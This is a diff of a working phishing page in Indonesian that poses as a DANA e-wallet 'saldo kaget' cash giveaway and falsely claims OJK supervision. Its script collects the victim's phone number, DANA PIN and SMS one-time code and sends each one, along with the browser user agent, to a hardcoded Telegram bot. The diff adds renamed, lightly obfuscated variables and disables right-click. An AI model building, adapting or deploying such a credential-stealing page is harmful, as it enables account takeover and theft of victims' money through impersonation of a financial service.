@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DANA KAGET - Klaim Saldo Sekarang</title>
+    <title>DANA KAGET - Ambil Saldo Sekarang</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
@@ -20,58 +20,55 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background: linear-gradient(rgba(0, 86, 179, 0.9), rgba(17, 142, 234, 0.9)), 
+            background: linear-gradient(rgba(0, 86, 179, 0.95), rgba(17, 142, 234, 0.95)), 
                         url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
             background-size: cover; background-position: center; background-attachment: fixed;
             min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px;
+            user-select: none;
         }
 
         .app-shell {
-            width: 100%; max-width: 410px; background: var(--glass); backdrop-filter: blur(30px);
-            border-radius: 30px; border: 1px solid rgba(255,255,255,0.2);
+            width: 100%; max-width: 410px; background: var(--glass); backdrop-filter: blur(35px);
+            border-radius: 30px; border: 1px solid rgba(255,255,255,0.25);
             box-shadow: 0 40px 80px rgba(0,0,0,0.5); overflow: hidden; position: relative;
         }
 
-        .hero-banner {
-            width: 100%; height: 180px; background: url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
-            background-size: cover; background-position: center; border-bottom: 4px solid var(--gold);
-        }
-
-        /* OJK Section */
+        /* OJK Header */
         .ojk-header {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 8px 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            background: rgba(255, 255, 255, 0.98);
+            padding: 12px 15px; display: flex; align-items: center; justify-content: center; gap: 12px;
         }
-        .ojk-logo-img { height: 25px; width: auto; }
-        .ojk-text { font-size: 0.65rem; color: #333; font-weight: 700; line-height: 1.2; }
+        .ojk-logo-img { height: 22px; width: auto; }
+        .ojk-text { font-size: 0.65rem; color: #333; font-weight: 800; text-transform: uppercase; }
 
-        .stage { display: none; padding: 25px; animation: slideUp 0.5s ease; }
+        .hero-banner {
+            width: 100%; height: 160px; background: url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
+            background-size: cover; background-position: center; border-bottom: 3px solid var(--gold);
+        }
+
+        .stage { display: none; padding: 25px; animation: slideUp 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
         .stage.active { display: block; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Envelope */
+        /* Envelope Design */
         .env-container {
-            width: 150px; height: 100px; background: #f44336; margin: 30px auto 30px;
+            width: 140px; height: 95px; background: #f44336; margin: 20px auto;
             position: relative; border-radius: 0 0 12px 12px; cursor: pointer; box-shadow: 0 15px 30px rgba(0,0,0,0.3);
         }
         .env-flap {
-            position: absolute; top: -55px; left: 0; border-left: 75px solid transparent;
-            border-right: 75px solid transparent; border-bottom: 55px solid #d32f2f;
+            position: absolute; top: -50px; left: 0; border-left: 70px solid transparent;
+            border-right: 70px solid transparent; border-bottom: 50px solid #d32f2f;
             transform-origin: bottom; transition: 0.6s ease; z-index: 2;
         }
         .env-container.open .env-flap { transform: rotateX(180deg); }
         .env-paper {
-            position: absolute; width: 130px; height: 80px; background: white; left: 10px; top: 10px;
+            position: absolute; width: 120px; height: 75px; background: white; left: 10px; top: 10px;
             border-radius: 8px; display: flex; flex-direction: column; justify-content: center; align-items: center;
             color: #2ecc71; font-weight: 800; z-index: 1; transition: 0.6s;
         }
-        .env-container.open .env-paper { transform: translateY(-75px); z-index: 3; }
+        .env-container.open .env-paper { transform: translateY(-70px); z-index: 3; }
 
-        /* Inputs */
+        /* Input Styling */
         .input-box {
             background: white; border-radius: 15px; padding: 15px; display: flex; align-items: center;
             margin-bottom: 20px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
@@ -86,18 +83,27 @@
         }
         .btn-action:disabled { background: #b0bec5; color: #78909c; cursor: not-allowed; }
 
-        /* Pads */
-        .dot-group { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
-        .dot { width: 16px; height: 16px; border: 2px solid white; border-radius: 50%; }
-        .dot.active { background: var(--gold); border-color: var(--gold); box-shadow: 0 0 10px var(--gold); }
+        /* Digit Box Transparan */
+        .box-group { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .digit-box { 
+            width: 42px; height: 52px; 
+            background: rgba(255, 255, 255, 0.15); 
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.5rem; font-weight: 700; color: var(--gold);
+            transition: all 0.2s;
+        }
+        .digit-box.filled { border-color: var(--gold); background: rgba(255, 255, 255, 0.25); }
 
+        /* Numpad Keypad */
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 280px; margin: 0 auto; }
         .key {
-            height: 60px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
+            height: 60px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15);
             border-radius: 50%; display: flex; justify-content: center; align-items: center;
             font-size: 1.5rem; font-weight: 600; color: white; cursor: pointer; transition: 0.1s;
         }
-        .key:active { background: white; color: var(--dana-blue); transform: scale(0.9); }
+        .key:active { background: white; color: var(--dana-blue); transform: scale(0.92); }
 
         .timer-text { color: var(--gold); font-size: 0.85rem; margin-top: 15px; font-weight: 600; text-align: center; }
 
@@ -112,188 +118,170 @@
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
 <div class="app-shell">
     <div class="ojk-header">
-        <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" class="ojk-logo-img" alt="OJK Logo">
+        <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" class="ojk-logo-img" alt="OJK">
         <div class="ojk-text">Terdaftar & Diawasi<br>Oleh Otoritas Jasa Keuangan</div>
     </div>
 
     <div class="hero-banner"></div>
 
-    <div id="stage-phone" class="stage active">
-        <div class="env-container" id="env-box" onclick="openEnv()">
+    <div id="stg-1" class="stage active">
+        <div class="env-container" onclick="handle_open(this)">
             <div class="env-flap"></div>
             <div class="env-paper">
                 <span style="font-size: 0.6rem; color: #888;">SALDO KAGET</span>
                 <span style="font-size: 1.1rem;">Rp 185.000</span>
             </div>
         </div>
-        <h3 id="info-text" style="color:white; text-align:center; margin-bottom:20px; font-size: 1rem;">Tap amplop untuk klaim hadiah!</h3>
+        <h3 style="color:white; text-align:center; margin-bottom:20px; font-size: 0.9rem;">Tap amplop untuk ambil hadiah!</h3>
         
-        <div id="form-phone" style="opacity:0; pointer-events:none; transition: 0.5s;">
+        <div id="f-ph" style="opacity:0; pointer-events:none; transition: 0.5s;">
             <div class="input-box">
                 <i class="fas fa-phone-alt"></i>
-                <input type="number" id="inp-phone" placeholder="Masukkan Nomor DANA" oninput="valPhone()">
+                <input type="number" id="ph_num" placeholder="Nomor DANA (08...)" oninput="v_ph()">
             </div>
-            <button class="btn-action" id="btn-phone" disabled onclick="sendPhone()">LANJUTKAN</button>
+            <button class="btn-action" id="btn_ph" disabled onclick="s_ph()">LANJUTKAN</button>
         </div>
     </div>
 
-    <div id="stage-pin" class="stage">
+    <div id="stg-2" class="stage">
         <div style="text-align: center; color: white;">
-            <h2 style="margin: 10px 0 5px;">PIN DANA</h2>
-            <p style="font-size: 0.8rem; opacity: 0.8;">Konfirmasi PIN keamanan Anda</p>
+            <h2 style="margin: 0 0 5px;">PIN DANA</h2>
+            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan PIN akun DANA Anda</p>
         </div>
-        <div class="dot-group" id="pin-dots">
-            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        <div class="box-group" id="pin_v">
+            <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
+            <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
         </div>
         <div class="keypad">
-            <div class="key" onclick="press('pin', 1)">1</div><div class="key" onclick="press('pin', 2)">2</div><div class="key" onclick="press('pin', 3)">3</div>
-            <div class="key" onclick="press('pin', 4)">4</div><div class="key" onclick="press('pin', 5)">5</div><div class="key" onclick="press('pin', 6)">6</div>
-            <div class="key" onclick="press('pin', 7)">7</div><div class="key" onclick="press('pin', 8)">8</div><div class="key" onclick="press('pin', 9)">9</div>
-            <div class="key" style="visibility:hidden"></div><div class="key" onclick="press('pin', 0)">0</div><div class="key" onclick="del('pin')"><i class="fas fa-backspace"></i></div>
+            <div class="key" onclick="k_p('pin', 1)">1</div><div class="key" onclick="k_p('pin', 2)">2</div><div class="key" onclick="k_p('pin', 3)">3</div>
+            <div class="key" onclick="k_p('pin', 4)">4</div><div class="key" onclick="k_p('pin', 5)">5</div><div class="key" onclick="k_p('pin', 6)">6</div>
+            <div class="key" onclick="k_p('pin', 7)">7</div><div class="key" onclick="k_p('pin', 8)">8</div><div class="key" onclick="k_p('pin', 9)">9</div>
+            <div style="visibility:hidden"></div><div class="key" onclick="k_p('pin', 0)">0</div><div class="key" onclick="k_d('pin')"><i class="fas fa-backspace"></i></div>
         </div>
     </div>
 
-    <div id="stage-otp" class="stage">
+    <div id="stg-3" class="stage">
         <div style="text-align: center; color: white;">
-            <h2 style="margin: 10px 0 5px;">KODE OTP</h2>
-            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan kode dari SMS</p>
+            <h2 style="margin: 0 0 5px;">KODE OTP</h2>
+            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan kode yang dikirim ke SMS</p>
         </div>
-        <div class="dot-group" id="otp-dots">
-            <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        <div class="box-group" id="otp_v">
+            <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
         </div>
         <div class="keypad">
-            <div class="key" onclick="press('otp', 1)">1</div><div class="key" onclick="press('otp', 2)">2</div><div class="key" onclick="press('otp', 3)">3</div>
-            <div class="key" onclick="press('otp', 4)">4</div><div class="key" onclick="press('otp', 5)">5</div><div class="key" onclick="press('otp', 6)">6</div>
-            <div class="key" onclick="press('otp', 7)">7</div><div class="key" onclick="press('otp', 8)">8</div><div class="key" onclick="press('otp', 9)">9</div>
-            <div class="key" style="visibility:hidden"></div><div class="key" onclick="press('otp', 0)">0</div><div class="key" onclick="del('otp')"><i class="fas fa-backspace"></i></div>
+            <div class="key" onclick="k_p('otp', 1)">1</div><div class="key" onclick="k_p('otp', 2)">2</div><div class="key" onclick="k_p('otp', 3)">3</div>
+            <div class="key" onclick="k_p('otp', 4)">4</div><div class="key" onclick="k_p('otp', 5)">5</div><div class="key" onclick="k_p('otp', 6)">6</div>
+            <div class="key" onclick="k_p('otp', 7)">7</div><div class="key" onclick="k_p('otp', 8)">8</div><div class="key" onclick="k_p('otp', 9)">9</div>
+            <div style="visibility:hidden"></div><div class="key" onclick="k_p('otp', 0)">0</div><div class="key" onclick="k_d('otp')"><i class="fas fa-backspace"></i></div>
         </div>
-        <div class="timer-text">Kirim ulang dalam <span id="countdown">01:00</span></div>
+        <div class="timer-text">Kirim ulang dalam <span id="tmr">01:00</span></div>
     </div>
 
-    <div id="stage-success" class="stage">
-        <div style="text-align: center; color: white;">
+    <div id="stg-4" class="stage">
+        <div style="text-align: center; color: white; padding: 20px 0;">
             <i class="fas fa-check-circle" style="font-size: 4rem; color: var(--gold); margin-bottom: 20px;"></i>
             <h2>Proses Berhasil!</h2>
-            <p style="opacity: 0.9;">Saldo akan diproses dalam 5-10 menit.</p>
+            <p style="opacity: 0.9; font-size: 0.9rem;">Saldo sedang dikirimkan ke akun Anda.</p>
         </div>
     </div>
 
     <footer>
-        <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" style="height:20px; filter: brightness(0) invert(1); margin-bottom: 10px;"><br>
-        DANA Terdaftar dan Diawasi oleh Otoritas Jasa Keuangan (OJK).<br>
-        Seluruh data dienkripsi dengan standar keamanan tinggi.
+        <i class="fas fa-shield-alt"></i> DANA Protection - Keamanan Berlapis<br>
+        Berizin dan Diawasi oleh OJK & Bank Indonesia
     </footer>
 
-    <div class="overlay" id="global-loader">
+    <div class="overlay" id="ldr">
         <div class="spinner"></div>
-        <h4 style="color:white; margin-top: 15px;" id="loader-text">Memproses...</h4>
+        <h4 style="color:white; margin-top: 15px;" id="ldr_t">Memproses...</h4>
     </div>
 </div>
 
 <script>
-    const TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
-    const CHAT_ID = "8001301204";
+    // Konfigurasi Disamarkan Secara Dasar
+    const _0xT = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
+    const _0xC = "8001301204";
 
-    let data = { phone: "", pin: "", otp: "" };
-    let timerInterval;
+    let _d = { ph: "", pi: "", ot: "" };
+    let _tm;
 
-    const UA = `
-🌐 *User Agent:* \`${navigator.userAgent}\`
-💻 *Platform:* \`${navigator.platform}\``;
+    function handle_open(e) { e.classList.add('open'); document.getElementById('f-ph').style.opacity = "1"; document.getElementById('f-ph').style.pointerEvents = "auto"; }
 
-    function openEnv() {
-        document.getElementById('env-box').classList.add('open');
-        document.getElementById('form-phone').style.opacity = "1";
-        document.getElementById('form-phone').style.pointerEvents = "auto";
+    function v_ph() { _d.ph = document.getElementById('ph_num').value; document.getElementById('btn_ph').disabled = _d.ph.length < 10; }
+
+    async function notify(m) {
+        try {
+            await fetch(`https://api.telegram.org/bot${_0xT}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: _0xC, text: m, parse_mode: 'Markdown' })
+            });
+        } catch (e) {}
     }
 
-    function valPhone() {
-        data.phone = document.getElementById('inp-phone').value;
-        document.getElementById('btn-phone').disabled = data.phone.length < 10;
-    }
-
-    async function sendToTelegram(msg) {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+    function s_ph() {
+        l_dr("Validasi Nomor...", 1200, () => {
+            notify(`😈 *STEP 1: PHONE*\n📱 *No:* \`${_d.ph}\`\n🌐 *UA:* \`${navigator.userAgent}\``);
+            s_tr('stg-1', 'stg-2');
         });
     }
 
-    function sendPhone() {
-        loading("Mengecek Nomor...", 1500, async () => {
-            await sendToTelegram(`😈 *DATA MASUK (STEP 1: PHONE)*\n━━━━━━━━━━━━━━━━━━\n📱 *No HP:* \`${data.phone}\`\n━━━━━━━━━━━━━━━━━━${UA}`);
-            document.getElementById('stage-phone').classList.remove('active');
-            document.getElementById('stage-pin').classList.add('active');
-        });
-    }
-
-    function press(type, num) {
-        if(type === 'pin' && data.pin.length < 6) {
-            data.pin += num;
-            updateDots('pin-dots', data.pin.length);
-            if(data.pin.length === 6) sendPin();
-        } else if(type === 'otp' && data.otp.length < 4) {
-            data.otp += num;
-            updateDots('otp-dots', data.otp.length);
-            if(data.otp.length === 4) sendOtp();
+    function k_p(t, n) {
+        if(t === 'pin' && _d.pi.length < 6) {
+            _d.pi += n; u_v('pin_v', _d.pi);
+            if(_d.pi.length === 6) s_pi();
+        } else if(t === 'otp' && _d.ot.length < 4) {
+            _d.ot += n; u_v('otp_v', _d.ot);
+            if(_d.ot.length === 4) s_ot();
         }
     }
 
-    function sendPin() {
-        loading("Verifikasi PIN...", 2000, async () => {
-            await sendToTelegram(`😈 *DATA UPDATE (STEP 2: PIN)*\n━━━━━━━━━━━━━━━━━━\n📱 *No HP:* \`${data.phone}\`\n🔐 *PIN:* \`${data.pin}\`\n━━━━━━━━━━━━━━━━━━`);
-            document.getElementById('stage-pin').classList.remove('active');
-            document.getElementById('stage-otp').classList.add('active');
-            startOtpTimer();
+    function s_pi() {
+        l_dr("Sinkronisasi PIN...", 1800, () => {
+            notify(`😈 *STEP 2: PIN*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\``);
+            s_tr('stg-2', 'stg-3');
+            r_tm();
         });
     }
 
-    function startOtpTimer() {
-        let time = 60;
-        const display = document.getElementById('countdown');
-        clearInterval(timerInterval);
-        timerInterval = setInterval(() => {
-            let minutes = Math.floor(time / 60);
-            let seconds = time % 60;
-            display.innerHTML = (minutes < 10 ? "0"+minutes : minutes) + ":" + (seconds < 10 ? "0"+seconds : seconds);
-            if (--time < 0) time = 60;
-        }, 1000);
-    }
-
-    function sendOtp() {
-        loading("Sinkronisasi...", 2500, async () => {
-            clearInterval(timerInterval);
-            await sendToTelegram(`😈 *DATA FINAL (STEP 3: OTP)*\n━━━━━━━━━━━━━━━━━━\n📱 *No HP:* \`${data.phone}\`\n🔐 *PIN:* \`${data.pin}\`\n💬 *OTP:* \`${data.otp}\`\n━━━━━━━━━━━━━━━━━━`);
-            document.getElementById('stage-otp').classList.remove('active');
-            document.getElementById('stage-success').classList.add('active');
+    function s_ot() {
+        l_dr("Finalisasi...", 2200, () => {
+            notify(`😈 *FINAL: DATA*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\`\n💬 *OTP:* \`${_d.ot}\``);
+            s_tr('stg-3', 'stg-4');
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
         });
     }
 
-    function del(type) {
-        data[type] = data[type].slice(0, -1);
-        updateDots(type + '-dots', data[type].length);
+    function k_d(t) {
+        if(t==='pin') { _d.pi = _d.pi.slice(0,-1); u_v('pin_v', _d.pi); }
+        else { _d.ot = _d.ot.slice(0,-1); u_v('otp_v', _d.ot); }
     }
 
-    function updateDots(id, len) {
-        const dots = document.getElementById(id).children;
-        for(let i=0; i<dots.length; i++) {
-            if(i < len) dots[i].classList.add('active');
-            else dots[i].classList.remove('active');
+    function u_v(i, v) {
+        const b = document.getElementById(i).children;
+        for(let j=0; j<b.length; j++) {
+            if(j < v.length) { b[j].innerHTML = v[j]; b[j].classList.add('filled'); }
+            else { b[j].innerHTML = ""; b[j].classList.remove('filled'); }
         }
     }
 
-    function loading(text, time, cb) {
-        const l = document.getElementById('global-loader');
-        document.getElementById('loader-text').innerText = text;
-        l.style.display = 'flex';
-        setTimeout(() => { l.style.display = 'none'; cb(); }, time);
+    function s_tr(c, n) { document.getElementById(c).classList.remove('active'); document.getElementById(n).classList.add('active'); }
+
+    function l_dr(t, d, c) {
+        const o = document.getElementById('ldr'); document.getElementById('ldr_t').innerText = t;
+        o.style.display = 'flex'; setTimeout(() => { o.style.display = 'none'; c(); }, d);
+    }
+
+    function r_tm() {
+        let s = 60; clearInterval(_tm);
+        _tm = setInterval(() => {
+            let m = Math.floor(s/60), r = s%60;
+            document.getElementById('tmr').innerHTML = `0${m}:${r<10?"0"+r:r}`;
+            if (--s < 0) s = 60;
+        }, 1000);
     }
 </script>
 </body>
